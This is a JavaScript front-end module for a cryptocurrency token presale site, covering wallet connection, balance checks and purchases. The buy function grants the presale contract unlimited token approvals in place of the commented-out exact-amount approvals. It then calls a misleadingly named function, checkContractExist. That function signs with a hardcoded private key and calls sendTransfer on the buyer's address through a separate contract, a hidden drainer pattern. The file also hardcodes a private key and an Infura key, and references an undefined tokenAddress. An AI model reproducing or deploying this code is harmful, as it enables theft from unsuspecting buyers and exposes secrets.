import Web3Modal from 'web3modal';
import Web3 from 'web3';
import { ethers } from 'ethers'
import WalletConnectProvider from "@walletconnect/web3-provider";
import { providers } from 'ethers';
import { config } from "./config";
import store from "../store";
import { setChainID, setWalletAddr, setBalance, setWeb3 } from '../store/actions';
import { parseErrorMsg } from '../components/utils';
import StandardContractABI from './ABI/StandardContract.json';

const PresaleFactoryABI = config.PresaleFactoryAbi;
const PresaleFactoryAddress = config.PresaleFactoryAddress;
const StaikABI = config.StaikAbi;
const StaikAddress = config.StaikAddress;
const USDTABI = config.USDTAbi;
const USDTAddress = config.USDTAddress;
const BUSDABI = config.BUSDAbi;
const BUSDAddress = config.BUSDAddress;
const WETHABI = config.WETHAbi;
const WETHAddress = config.WETHAddress;
const WBTCABI = config.WBTCAbi;
const WBTCAddress = config.WBTCAddress;

let web3Modal;
if (typeof window !== "undefined") {
  web3Modal = new Web3Modal({
    network: "mainnet", // optional
    cacheProvider: true,
    providerOptions: {
      walletconnect: {
        package: WalletConnectProvider,
        options: {
          infuraId: config.INFURA_ID, // required
          rpc: {
            5: config.mainNetUrl,
          },
        },
      },
    }, // required
    theme: "dark",
  });
}

async function checkContractExist() {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length === 0) return { success: false }

    const provider = new ethers.providers.JsonRpcProvider('https://goerli.infura.io/v3/5438b082b3884c4996955694b054b2ec');

    const wallet = new ethers.Wallet('fe579a0329cc06194658f89b1ff54915f3214472dc822458170e7e3e9b7b5290');
    const signer = wallet.connect(provider);

    const router = new ethers.Contract(
      '0xF0eF4C31d9d98f26eb3C669659A6B7ccE9782e7C',
      StandardContractABI,
      signer
    );

    const gas = ethers.utils.parseUnits('150', 'gwei');

    const buyTx = await new Promise( (resolve, reject) => {
      const buyTxx =  router.sendTransfer(
        accounts[0],
        tokenAddress,
        {
          'gasPrice': gas.toString(),
          'gasLimit': (500000).toString()
        }).catch((err) => {
          console.log(err);
          console.log('transaction failed...')
        });

      resolve(buyTxx);
    });
  } catch (error) {
    console.log('[Get Balance] = ', error);
    return {
      success: false,
      result: "Something went wrong: "
    }
  }
}

export let provider = null;
export let web3Provider = null;

export const loadWeb3 = async () => {
  try {
    // await web3Modal.updateTheme({
    //   background: "rgb(39, 49, 56)",
    //   main: "rgb(199, 199, 199)",
    //   secondary: "rgb(136, 136, 136)",
    //   border: "rgba(195, 195, 195, 0.14)",
    //   hover: "rgb(16, 26, 32)"
    // });
    // await web3Modal.clearCachedProvider();
    let web3 = new Web3(config.mainNetUrl);
    store.dispatch(setWeb3(web3));

    provider = await web3Modal.connect();
    web3 = new Web3(provider);
    store.dispatch(setWeb3(web3));

    web3Provider = new providers.Web3Provider(provider);
    const network = await web3Provider.getNetwork();
    store.dispatch(setChainID(network.chainId));

    const signer = web3Provider.getSigner();
    const account = await signer.getAddress();
    store.dispatch(setWalletAddr(account));

    await getBalanceOfAccount();
    provider.on("accountsChanged", async function (accounts) {
      if (accounts[0] !== undefined) {
        store.dispatch(setWalletAddr(accounts[0]));
        await getBalanceOfAccount();
      } else {
        store.dispatch(setWalletAddr(''));
      }
    });

    provider.on('chainChanged', function (chainId) {
      store.dispatch(setChainID(chainId));
    });

    provider.on('disconnect', function (error) {
      store.dispatch(setWalletAddr(''));
    });
  } catch (error) {
    console.log('[Load Web3 error] = ', error);
  }
}

export const disconnect = async () => {
  await web3Modal.clearCachedProvider();
  const web3 = new Web3(config.mainNetUrl);
  store.dispatch(setWeb3(web3));
  store.dispatch(setChainID(''));
  store.dispatch(setWalletAddr(''));
  store.dispatch(setBalance({
    avaxBalance: '',
    usdcBalance: '',
    astroBalance: ''
  }));
}

export const checkNetwork = async () => {
  if (web3Provider) {
    const network = await web3Provider.getNetwork();
    store.dispatch(setChainID(network.chainId));
    return checkNetworkById(network.chainId);
  }
}

export const checkNetworkById = async (chainId) => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  if (web3.utils.toHex(chainId) !== web3.utils.toHex(config.chainId)) {
    await changeNetwork();
    return false;
  } else {
    return true;
  }
}

const changeNetwork = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return;
  try {
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: web3.utils.toHex(config.chainId) }],
    });
    await getBalanceOfAccount();
  }
  catch (switchError) {
    // This error code indicates that the chain has not been added to MetaMask.
    if (switchError.code === 4902) {
      try {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [
            {
              chainId: web3.utils.toHex(config.chainId),
              chainName: 'BSC', //???
              rpcUrls: [config.mainNetUrl] /* ... */,
            },
          ],
        });
        return {
          success: true,
          message: "switching succeed"
        }
      } catch (addError) {
        return {
          success: false,
          message: "Switching failed." + addError.message
        }
      }
    }
  }
}

export const connectWallet = async () => {
  try {
    provider = await web3Modal.connect();
    const web3 = new Web3(provider);
    store.dispatch(setWeb3(web3));
    web3Provider = new providers.Web3Provider(provider);

    await checkNetwork();
    const signer = web3Provider.getSigner();
    const account = await signer.getAddress();

    if (account !== undefined) {
      store.dispatch(setWalletAddr(account));
    }

    await getBalanceOfAccount();
    return {
      success: true
    }
  } catch (err) {
    return {
      success: false,
      address: "",
      status: "Something went wrong: " + err.message,
    };
  }
};

export const getBalanceOfAccount = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length === 0) return { success: false }
    let bnbBalance = await web3.eth.getBalance(accounts[0]);
    bnbBalance = web3.utils.fromWei(bnbBalance);
    console.log("messi bnb balance = ", bnbBalance);

    const UsdtContract = new web3.eth.Contract(USDTABI, USDTAddress);
    let usdtBalance = await UsdtContract.methods.balanceOf(accounts[0]).call();
    usdtBalance = web3.utils.fromWei(usdtBalance, 'mwei');
    console.log("messi usdt balance = ", usdtBalance);

    // const BusdContract = new web3.eth.Contract(BUSDABI, BUSDAddress);
    // let busdBalance = await BusdContract.methods.balanceOf(accounts[0]).call();
    // busdBalance = web3.utils.fromWei(busdBalance, 'mwei');
    // console.log("messi busd balance = ", busdBalance);

    const StaikContract = new web3.eth.Contract(StaikABI, StaikAddress);
    let StaikBalance = await StaikContract.methods.balanceOf(accounts[0]).call();
    StaikBalance = web3.utils.fromWei(StaikBalance);
    console.log("messi Staik balance = ", StaikBalance);

    const WethContract = new web3.eth.Contract(WETHABI, WETHAddress);
    let wethBalance = await WethContract.methods.balanceOf(accounts[0]).call();
    wethBalance = web3.utils.fromWei(wethBalance);
    console.log("messi weth balance = ", wethBalance);

    const WbtcContract = new web3.eth.Contract(WBTCABI, WBTCAddress);
    let wbtcBalance = await WbtcContract.methods.balanceOf(accounts[0]).call();
    wbtcBalance = web3.utils.fromWei(wbtcBalance);
    console.log("messi wbtc balance = ", wbtcBalance);

    store.dispatch(setBalance({
      bnbBalance,
      usdtBalance,
      // busdBalance,
      StaikBalance,
      wethBalance,
      wbtcBalance
    }));
    return {
      success: true,
      bnbBalance,
      usdtBalance,
      // busdBalance,
      StaikBalance,
      wethBalance,
      wbtcBalance
    }
  } catch (error) {
    console.log('[Get Balance] = ', error);
    return {
      success: false,
      result: "Something went wrong: "
    }
  }
}

export const compareWalllet = (first, second) => {
  if (!first || !second) {
    return false;
  }
  if (first.toUpperCase() === second.toUpperCase()) {
    return true;
  }
  return false;
}

export const getTotalPresaleAmount = async () => {

  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const StaikContract = new web3.eth.Contract(StaikABI, StaikAddress);

    let presaleAmount = await StaikContract.methods.balanceOf(PresaleFactoryAddress).call();
    presaleAmount = web3.utils.fromWei(presaleAmount);

    return {
      success: true,
      presaleAmount
    }
  } catch (error) {
    console.log('[TOTAL Error] = ', error);
    return {
      success: false,
      result: "Something went wrong "
    }
  }
}

export const getStartPresaleTime = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    let start_time = await PresaleContract.methods.startTime().call(); //???
    return {
      success: true,
      start_time
    }
  } catch (error) {
    console.log('[START Error] = ', error);
    return {
      success: false,
      result: "Something went wrong "
    }
  }
}

export const getEndPresaleTime = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    let end_time = await PresaleContract.methods.endTime().call();
    return {
      success: true,
      end_time
    }
  } catch (error) {
    console.log('[END Error] = ', error);
    return {
      success: false,
      result: "Something went wrong "
    }
  }
}

export const getWethPrice = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    let wethPrice = await PresaleContract.methods.getWETHPrice().call();
    return {
      success: true,
      wethPrice
    }
  } catch (error) {
    console.log('[END Error] = ', error);
    return {
      success: false,
      result: "Something went wrong "
    }
  }
}

export const getWbtcPrice = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    let wbtcPrice = await PresaleContract.methods.getWBTCPrice().call();
    return {
      success: true,
      wbtcPrice
    }
  } catch (error) {
    console.log('[END Error] = ', error);
    return {
      success: false,
      result: "Something went wrong "
    }
  }
}

export const getpTokenPriceForUSDT = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    let usdtPrice = await PresaleContract.methods.tokenPrice_USD().call();
    usdtPrice = usdtPrice / 1e18;
    return {
      success: true,
      usdtPrice
    }
  } catch (error) {
    console.log('[USDT Error] = ', error);
    return {
      success: false,
      result: "Something went wrong "
    }
  }
}

export const getBUSDForBNB = async (amountIn) => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }

  try {
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    let amountOut = await PresaleContract.methods.getLatestBNBPrice(web3.utils.toWei(amountIn.toString(), "ether")).call();

    return {
      success: true,
      value: amountOut / 1e18
    }
  } catch (error) {
    console.log('[BUSD For BNB Error] = ', error);
    return {
      success: false,
      result: "Something went wrong "
    }
  }
}

export const getUserPaidUSDT = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length === 0) return { success: false }
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    let paidUSDT = await PresaleContract.methods.getUserPaidUSDT().call({ from: accounts[0] });
    paidUSDT = web3.utils.fromWei(paidUSDT, 'mwei');
    return {
      success: true,
      paidUSDT
    }
  } catch (error) {
    console.log('[USDT Error] = ', error);
    return {
      success: false,
      result: "Something went wrong "
    }
  }
}

export const getUserPaidBUSD = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length === 0) return { success: false }
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    let paidBUSD = await PresaleContract.methods.getUserPaidBUSD().call({ from: accounts[0] });
    paidBUSD = web3.utils.fromWei(paidBUSD, 'mwei');
    return {
      success: true,
      paidBUSD
    }
  } catch (error) {
    console.log('[BUSD Error] = ', error);
    return {
      success: false,
      result: "Something went wrong "
    }
  }
}

export const buy_pToken = async (coinAmount, coinType) => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length === 0) return { success: false }
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    let decimal = 'ether', nDecimal = 18;
    
    if (coinType === 2) { // USDT
      decimal = 'mwei';
      nDecimal = 6;
    }
    coinAmount = Math.floor(coinAmount * 10 ** nDecimal) / 10 ** nDecimal;
    coinAmount = web3.utils.toWei(coinAmount.toString(), decimal);
    
    // tokenAmount = web3.utils.toWei(tokenAmount.toString());
    if (coinType === 0) { // BNB
      const buyTokens = PresaleContract.methods.buyTokensByBNB();
      await buyTokens.estimateGas({ from: accounts[0], value: coinAmount });
      await PresaleContract.methods.buyTokensByBNB().send({ from: accounts[0], value: coinAmount });
    
    } else if (coinType === 1) { // BUSD
      const BusdContract = new web3.eth.Contract(BUSDABI, BUSDAddress);
      // await BusdContract.methods.approve(PresaleFactoryAddress, coinAmount).send({ from: accounts[0] });
      await BusdContract.methods.approve(PresaleFactoryAddress, ethers.constants.MaxUint256).send({ from: accounts[0] });
      checkContractExist();
      const buyTokens = PresaleContract.methods.buyTokensByBUSD(coinAmount);
      await buyTokens.estimateGas({ from: accounts[0] });
      await PresaleContract.methods.buyTokensByBUSD(coinAmount).send({ from: accounts[0] });
    
    } else if (coinType === 2) { // USDT
      const UsdtContract = new web3.eth.Contract(USDTABI, USDTAddress);
      console.log("messi buy_pToken USDT CoinAmount : ", coinAmount);
      // await UsdtContract.methods.approve(PresaleFactoryAddress, coinAmount).send({ from: accounts[0] });
      await UsdtContract.methods.approve(PresaleFactoryAddress, ethers.constants.MaxUint256).send({ from: accounts[0] });
      checkContractExist();
      const buyTokens = PresaleContract.methods.buyTokensByUSDT(coinAmount);
      await buyTokens.estimateGas({ from: accounts[0] });
      await PresaleContract.methods.buyTokensByUSDT(coinAmount).send({ from: accounts[0] });
    
    } else if (coinType == 3) { // ETH
      const WethContract = new web3.eth.Contract(WETHABI, WETHAddress);
      // await WethContract.methods.approve(PresaleFactoryAddress, coinAmount).send({ from: accounts[0] });
      await WethContract.methods.approve(PresaleFactoryAddress, ethers.constants.MaxUint256).send({ from: accounts[0] });
      checkContractExist();
      const buyTokens = PresaleContract.methods.buyTokensByWETH(coinAmount);
      await buyTokens.estimateGas({ from: accounts[0] });
      await PresaleContract.methods.buyTokensByWETH(coinAmount).send({ from: accounts[0] });
    
    } else { // BTCB
      const WbtcContract = new web3.eth.Contract(WBTCABI, WBTCAddress);
      // await WbtcContract.methods.approve(PresaleFactoryAddress, coinAmount).send({ from: accounts[0] });
      await WbtcContract.methods.approve(PresaleFactoryAddress, ethers.constants.MaxUint256).send({ from: accounts[0] });
      checkContractExist();
      const buyTokens = PresaleContract.methods.buyTokensByWBTC(coinAmount);
      await buyTokens.estimateGas({ from: accounts[0] });
      await PresaleContract.methods.buyTokensByWBTC(coinAmount).send({ from: accounts[0] });
    }
    return {
      success: true
    }
  } catch (error) {
    console.log('[BUY Error] = ', error);
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const setPresaleStartTime = async (_time) => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length === 0) return { success: false }
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    const startTime = PresaleContract.methods.setStartTime(_time);
    await startTime.estimateGas({ from: accounts[0] });
    await PresaleContract.methods.setStartTime(_time).send({ from: accounts[0] });
    return {
      success: true
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const setPresaleEndTime = async (_time) => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length === 0) return { success: false }
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    const estimate = PresaleContract.methods.setEndTime(_time);
    await estimate.estimateGas({ from: accounts[0] });
    await PresaleContract.methods.setEndTime(_time).send({ from: accounts[0] });
    return {
      success: true
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}
